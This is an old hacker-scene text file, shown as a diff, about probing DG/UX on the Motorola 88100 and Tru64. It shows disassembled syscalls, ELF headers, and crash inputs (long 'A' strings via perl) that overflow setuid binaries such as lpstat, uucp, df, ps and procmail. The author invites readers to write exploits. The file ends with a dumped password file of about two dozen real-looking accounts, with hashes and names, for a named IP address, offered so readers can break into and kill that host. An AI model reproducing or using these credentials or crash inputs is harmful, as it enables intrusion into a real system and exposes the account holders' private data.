@@ -1,0 +1,135 @@
+
+        ,Ús%$%s¿,      
+       Ú$$7"^"?$$L     
+      i$$',d$b,'$$;  
+yyyyyyyy$ $$$$$ $$l    digital unix
+^^""ýýý"' '%$%',$$F    by madcr 
+             ,s$$?;,_             __,,__                          
+             '?$'j$$$$%syyyÚÚÚÚy¸$ýý""^"ý
+                ^ý$$$ýý"^             
+
+                                               --  1990 born osf/1
+                                               --  1998 rename to digital unix
+                                               --  1999 rename to tru64
+
+
+ It  happened, that I  casually, have came across dgux port on mc88100, which I
+ especially have interested in.This processor is based on risc technology,which
+ works on  frequency  from 25mhz (!) and it is the  first in the series (by the 
+ way, motorola  product again). This dgux port called AViON, and there are many 
+ versions of these ports,as well as should be: AViON R4.11MU06,AViON 5.4.R4.11,
+ etc. Developments are frozen for a long time, but interest for the sake of ...
+
+ What has slightly surprised me first of all, are this inconstancy of syscalls:
+
+ 0x10054c <_.text.start+28>:     bsr              <_open>
+ 0x10056c <_.text.start+60>:     bsr              <_write>
+ 0x100570 <_.text.start+64>:     bsr              <exit>
+
+ ..........
+
+ 0x100588 <_open>:       or              r9,r0,0x29
+ 0x10058c <_open+4>:     tb0             0,r0,0x80    <-- 0x80
+ 0x100590 <_open+8>:     br               <_cerror>
+ 0x100594 <_open+12>:    jmp             r1
+ 0x100598 <_write>:      or              r9,r0,0x44
+ 0x10059c <write+4>:     tb0             0,r0,0x1c2   <-- 0x1c2
+ 0x1005a0 <write+8>:     br               <_cerror>
+ 0x1005a4 <write+12>:    jmp             r1
+ 0x100658 <_exit>:       or              r9,r0,0x09
+ 0x10065c <_exit+4>:     tb0             0,r0,0x1c2   <-- 0x1c2
+ 0x100660 <_exit+8>:     br               <_cerror>
+ 0x100664 <_exit+12>:    jmp             r1
+
+ Further behind, it appeared, that elf files have processor-specific records:
+ 
+ Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  LOPROC+8000001 0x000200 0x00000000 0x00000000 0x00000 0x00000     0
+  PHDR           0x000034 0x00100034 0x00000000 0x00100 0x00100 R E 0
+  INTERP         0x000134 0x00000000 0x00000000 0x00015 0x00000 R   0
+      [Requesting program interpreter: /usr/dglib/libc.so.1]
+  LOAD           0x000034 0x00100034 0x00000000 0x00e80 0x00e80 R E 0x10000
+  LOAD           0x000eb4 0x00110eb4 0x00000000 0x00164 0x00564 RW  0x10000
+  DYNAMIC        0x000ed8 0x00110ed8 0x00000000 0x00090 0x00000 RW  0
+  LOPROC+1       0x000c70 0x00100c70 0x00000000 0x00000 0x00000 R E 0
+  NULL           0x000000 0x00000000 0x00000000 0x00000 0x00000     0
+
+ As you can see,one section in general without flags,another executable.To rum-
+ mage is in what:) Experiments for the sake of,I shall give you a pair accounts
+ on box at the end. Will arrange dirty evil - host will die.
+ 
+ That banal bof the sea, it is clear at once (time lets know). And not, that in
+ any tricky arguments, but at once in the first. I have checked up around 10-20
+ files and it was found 3 at once:
+
+
+ # ls -la /usr/bin/lpstat
+ -r-xr-xr-x   1 lp       lp        181472 1999ð  6c›   5î® /usr/bin/lpstat
+ # /usr/bin/lpstat `perl -e "print 'A' x 4000"`
+ ØØÌ¢Ëž¥¢î«Ø£ cîô› - core dumped
+
+
+ # ls -la /usr/bin/uucp
+ ---s--x--x   1 uucp     uucp       89440 1999ð  6c›   5î® /usr/bin/uucp
+ # /usr/bin/uucp `perl -e 'print "A" x 8000'`
+ ØØÌ¢Ëž¥¢î«Ø£ cîô›
+
+
+ # ls -la /usr/bin/df
+ -rwsr-xr-x   1 root     bin        17536 1995ð 10c›  20î® /usr/bin/df
+ # /usr/bin/df `perl -e "print 'A' x 1699"`
+ ØØÌ¢Ëž¥¢î«Ø£ cîô›
+
+ Who will be interested, write tons of expl shit.
+
+ By the way, speaking about digital unix, on different Tru64 (not the last ver-
+ sion) there are  not less problems, and all of them in the same, stupid, first 
+ arguments :) (its 2003 year by the way):
+
+
+ > ls -la /usr/bin/ps
+ -rws--x--x   1 root     bin        73984 Aug 24  2000 /usr/bin/ps
+ > /usr/bin/ps AAAAAAAAAAAAAA
+ Segmentation fault
+
+
+ > ls -la /usr/local/bin/procmail
+ -rwsr-xr-x   1 root     system    132240 Feb 12  2002 /usr/local/bin/procmail
+ > /usr/local/bin/procmail
+ [ctrl+c]
+ procmail: Terminating prematurely
+ Segmentation fault (core dumped)
+
+
+ In general - it was fun and interesting. Article (if you can say so) if only
+ for introduction acquaintance. No more than that. 
+
+ And as promised in the beginning, some accs on dg/ux mc88100 (211.114.147.22):
+
+ ....
+ kolas:eBzjl0QMxRXc2:151:100::/usr/account/STAFF/kolas:/sbin/sh
+ informix:xq3giGUS6IEF2:152:101::/informix:/sbin/sh
+ sukang::153:103::/smus/sukang:/sbin/sh
+ zws:fQOj1ksjWHGCU:154:100:zung-won system user:/home/zws:/sbin/sh
+ ibsi:JEYsQhfDKEc.6:155:101::/haksa/ibsi:/sbin/sh
+ f6213212:wIyaiDaRoWgcY:156:603:È¸°è-¿ì½ÂÇÑ:/usr/accont/hanbit/f6213212:/sbin/sh
+ bhjun:p7uLNUiZrKQDw:232:102::/usr/accout/PROF/bhjun:/sbin/sh
+ jmc65:r6O84GPgxc7sU:236:102:Á¤¸íÃ¤:/usr/account/PROF/jmc65:/sbin/sh
+ workadmin:UtTPubiV8Nv5o:159:600::/workgroup/workadmin:/sbin/sh
+ info7:rl6r8JjJH1DUI:160:632:Àå¿µ¿ì:/usr/infoser/info7:/sbin/sh
+ belegre:zDfyhKgdkl26E:363:102:±Ç¿µ¾Ö:/usr/accont/PROF/belegre:/sbin/sh
+ ywl-7562:iI7s7E6ABM7zc:163:102::/usr/account/PROF/ywl-7562:/sbin/sh
+ pdw403:gySM5Em.FGuis:164:102::/usr/account/PROF/pdw403:/sbin/sh
+ lsp415:htf.l881Uvi1.:165:102::/usr/account/PROF/lsp415:/sbin/sh
+ ljy409:ir73QmHfg1caY:166:102::/usr/account/PROF/ljy409:/sbin/sh
+ kbo420:7qQcxHVO3IF0.:167:102::/usr/account/PROF/kbo420:/sbin/sh
+ ich410:fiBVhv2.zLhG2:168:102::/usr/account/PROF/ich410:/sbin/sh
+ ivey-414:DhZ4XX1Yaxl3U:169:102::/usr/account/PROF/ivey-414:/sbin/sh
+ hmy-414:Ne8rLzT158KKw:170:102::/usr/account/PROF/hmy-414:/sbin/sh
+ p412:ecqjaQ3mfbn9E:171:102::/usr/account/PROF/p412:/sbin/sh
+ sgcho:ae5Fin5dtzuLI:172:102::/usr/account/PROF/sgcho:/sbin/sh
+ sjkang:j2ciTd35FKQi6:173:102::/usr/account/PROF/sjkang:/sbin/sh
+ p518:CNZR.oTXXH/9E:174:102::/usr/account/PROF/p518:/sbin/sh
+ p408:GQD7fMj4C7PjE:175:102::/usr/account/PROF/p408:/sbin/sh
+ ....
